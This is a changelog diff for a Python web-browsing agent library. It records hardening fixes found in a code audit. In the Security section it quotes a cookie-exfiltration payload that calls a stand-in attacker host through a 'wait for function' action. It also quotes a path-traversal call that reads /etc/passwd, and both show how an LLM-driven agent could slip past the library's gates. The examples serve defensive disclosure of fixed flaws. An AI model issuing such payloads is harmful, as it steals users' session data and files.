@@ -1,5 +1,170 @@
 # Changelog
 
+## [1.6.14] - 2026-05-28
+
+### Hardening — 8 Critical fixes from the full-codebase audit
+
+A full-codebase brutal review (4 parallel `feature-dev:code-reviewer`
+agents, no overlap, ≥60% confidence threshold) surfaced 8 genuine
+Critical defects spanning security, DoS, and silent data loss. All
+8 are fixed in this slice. Test count grows ~764 -> ~786 (+22 new
+tests across 3 new files: `tests/test_v1614_security.py`,
+`tests/test_v1614_throughput.py`, `tests/test_v1614_pipeline.py`).
+
+Implementation was delegated to 3 specialized agents working in
+parallel on disjoint file sets (Security cluster, DoS/throughput
+cluster, Pipeline cluster); the slice took ~12 minutes wall-clock.
+
+### Security (3 fixes)
+
+1. **C-2: `WaitInput(target=FUNCTION)` now honours `safety.allow_js_evaluation`.**
+   Pre-v1.6.14, the pre-flight scanner in `BrowserActions.execute_sequence`
+   blocked `EvaluateInput` when `allow_js_evaluation=False` but did NOT
+   gate `WaitInput(target=FUNCTION)`, which calls
+   `page.wait_for_function(action.value)` -- arbitrary JavaScript
+   execution in the page context. An LLM-controlled sequence could
+   bypass the JS-evaluation gate by emitting
+   `{"action": "wait", "target": "function", "value": "fetch('https://attacker/'+document.cookie)"}`
+   and exfiltrate session cookies. The pre-flight gate now blocks both
+   action types symmetrically. (`browser_actions.py`)
+
+2. **C-3: `Agent.replay_trace` and `TraceRecorder.load_entries` now
+   contain `trace_file` paths to `trace_dir`.** The MCP
+   `web_replay_trace` tool accepted `trace_file: str` directly from
+   the LLM with no path validation -- `Path(trace_file)` opened
+   whatever the LLM passed. An LLM could read arbitrary world-readable
+   files via `web_replay_trace(trace_file="/etc/passwd")`. Now both
+   the agent-layer entry point AND the trace-recorder file-load
+   primitive resolve the path and reject anything outside
+   `trace_dir`. Defense-in-depth: catches both direct API calls and
+   MCP-routed calls. (`agent.py` + `trace_recorder.py`)
+
+3. **C-5: `web_interact` MCP docstring now lists all 19 action types.**
+   The docstring claimed "Supports 12 action types: click, type, fill,
+   scroll, screenshot, navigate, dialog, hover, select, keyboard,
+   wait, evaluate." -- the pre-v1.6.6 list. The real `Action` union
+   has 19 members. Every MCP client (Claude Desktop, Claude Code,
+   Cursor, etc.) displays this docstring to its LLM, so LLMs were
+   never told they could use the v1.6.6/v1.6.7 actions: `click_xy`,
+   `type_text`, `press_key`, `upload_file`, `iframe_click`,
+   `shadow_dom_click`, `drag_and_drop`. **7 action types were
+   effectively invisible to MCP callers.** Now corrected to 19 with
+   full enumeration. (`mcp_server.py`)
+
+### Throughput / DoS (3 fixes)
+
+4. **C-1: `RateLimiter.notify_429` caps `Retry-After` at 300 seconds.**
+   A server returning `Retry-After: 99999999` (positive integer,
+   parses cleanly via `parse_retry_after`) would cause the next
+   `acquire(host)` to sleep for ~1157 days, hanging the coroutine
+   forever. New `RateLimiter.MAX_RETRY_AFTER_SECONDS = 300.0` class
+   constant clamps the delay; an explicit `delay = min(delay,
+   MAX_RETRY_AFTER_SECONDS)` is applied after the raw computation.
+   Closes a one-line-server-response DoS. (`rate_limiter.py`)
+
+5. **C-4: `WebFetcher.fetch_many` with `session_id` is now bounded by
+   `asyncio.Semaphore(BrowserConfig.max_pages_per_session_fetch)`**
+   (default 5). Pre-v1.6.14, `fetch_many(urls, session_id=sid)` ran
+   `asyncio.gather` over all URLs into a single `BrowserContext`,
+   bypassing `BrowserManager._semaphore` (which gates only ephemeral
+   contexts). Reproducibly crashed the Chromium renderer at ~20+
+   parallel pages. The new config field is bounded to `[1, 50]`; the
+   ephemeral path remains gated by its existing semaphore.
+   (`web_fetcher.py` + `config.py`)
+
+6. **C-7: `NetworkCollector.wait_for_pending_bodies` now cancels
+   orphaned tasks on timeout.** Pre-v1.6.14 used
+   `asyncio.wait_for(asyncio.gather(*pending, return_exceptions=True),
+   timeout=N)`. On timeout, `wait_for` cancels the wrapper future but
+   `gather(return_exceptions=True)` does NOT cancel its children --
+   they continue running orphaned against possibly-closed Pages.
+   Replaced with `asyncio.wait(timeout=N)` returning `(done,
+   pending)`, then explicit `task.cancel()` per pending plus a final
+   `gather(*pending, return_exceptions=True)` drain to suppress
+   "Task was destroyed but is pending" warnings.
+   (`network_collector.py`)
+
+### Pipeline correctness (2 fixes)
+
+7. **C-6: `Recipes.fill_form_and_extract` now returns
+   `ExtractionResult(extraction_method="none")` when the navigation
+   race kills content capture.** Pre-v1.6.14, when
+   `safe_page_content` returned `("", "navigating")`, the code logged
+   a warning then built `FetchResult(status=SUCCESS, html="")` and
+   ran extraction. The extractor returned `extraction_method="none"`
+   anyway (because `not fr.html`), but the misleading SUCCESS status
+   made it impossible for callers to distinguish "form worked, empty
+   page" from "navigation race killed extraction." Now short-circuits
+   before building the misleading FetchResult -- matches the
+   `Downloader._do_save_page` `NETWORK_ERROR` pattern from v1.6.13.
+   (`recipes.py`)
+
+8. **C-8: `TabManager.close_tab` now holds `_lock` across
+   `page.close()`.** Pre-v1.6.14, the lock was released before
+   awaiting the Playwright close. During the await, the sync
+   `_evict_on_close` callback fired (lockless by design, just mutates
+   dicts) -- but a concurrent `switch_tab` / `new_tab` / `list_tabs`
+   call holding the lock could observe an inconsistent intermediate
+   state where `_current_tab_id` pointed at a tab being torn down.
+   Now the entire close operation runs inside `async with self._lock`;
+   `_evict_on_close` still runs sync during the await, but no other
+   async coroutine can interleave a state read. (`tab_manager.py`)
+
+### Files changed
+
+- `web_agent/agent.py` (+21 LOC: replay_trace path containment)
+- `web_agent/browser_actions.py` (+19 LOC: WaitInput JS gate)
+- `web_agent/config.py` (+22 LOC: `max_pages_per_session_fetch`)
+- `web_agent/mcp_server.py` (+15 LOC: docstring 12->19 actions)
+- `web_agent/network_collector.py` (+46 LOC net: wait/cancel rewrite)
+- `web_agent/rate_limiter.py` (+24 LOC: MAX_RETRY_AFTER + clamp)
+- `web_agent/recipes.py` (+22 LOC: nav-race short-circuit)
+- `web_agent/tab_manager.py` (+29 LOC: lock-scoped close)
+- `web_agent/trace_recorder.py` (+17 LOC: load_entries containment)
+- `web_agent/web_fetcher.py` (+28 LOC: fetch_many semaphore)
+- `tests/test_v1614_security.py` (NEW, 8 tests)
+- `tests/test_v1614_throughput.py` (NEW, 8 tests)
+- `tests/test_v1614_pipeline.py` (NEW, 4 tests)
+- `web_agent/__init__.py` (version 1.6.13 -> 1.6.14)
+- `CHANGELOG.md`, `README.md`, `AGENTS.md` (entry + banners)
+
+### Migration
+
+No breaking changes to any documented v1.6.13 public API.
+
+- The new `BrowserConfig.max_pages_per_session_fetch` field defaults
+  to `5`. Callers that previously did
+  `agent.fetch_many(urls, session_id=sid)` with 20+ URLs will now see
+  their fetches serialised 5 at a time on that session (the previous
+  behaviour crashed Chromium at ~20). Raise the cap via
+  `AppConfig(browser={"max_pages_per_session_fetch": 20})` if you
+  have a beefy renderer and want the old behaviour back.
+- `Recipes.fill_form_and_extract` previously returned an
+  `ExtractionResult` derived from `FetchResult(status=SUCCESS,
+  html="")` when the page raced. It still returns an
+  `ExtractionResult` with `extraction_method="none"` in the same
+  situation, but no `FetchResult` is built at all -- callers
+  inspecting `result.url` and `result.extraction_method` see the
+  same shape; callers introspecting the (never-exposed) intermediate
+  `FetchResult` would not have seen it anyway.
+- `MCP web_replay_trace` callers now get a `ValueError` if they pass
+  a path outside `trace_dir`. The error message includes the
+  expected directory.
+- All other behaviour is strictly additive or makes a previously-
+  silent failure more visible.
+
+### Why agents-in-parallel for this slice
+
+The 8 Criticals naturally partitioned by file: 4 files for Security,
+4 files for Throughput, 2 files for Pipeline -- zero overlap. Three
+`general-purpose` agents ran concurrently in the background, each
+with an exact diff specification and per-cluster verification
+(pytest + ruff + mypy on just their files). Integration phase then
+ran full-codebase verification + docs + version + commit. Total
+wall-clock: ~12 minutes for 8 fixes + 20 tests + 3 new test files
++ docs. The full-codebase audit + 4 parallel reviewers that
+surfaced the Criticals was the v1.6.13 close-out step.
+
 ## [1.6.13] - 2026-05-28
 
 ### Page Content Capture Resilience
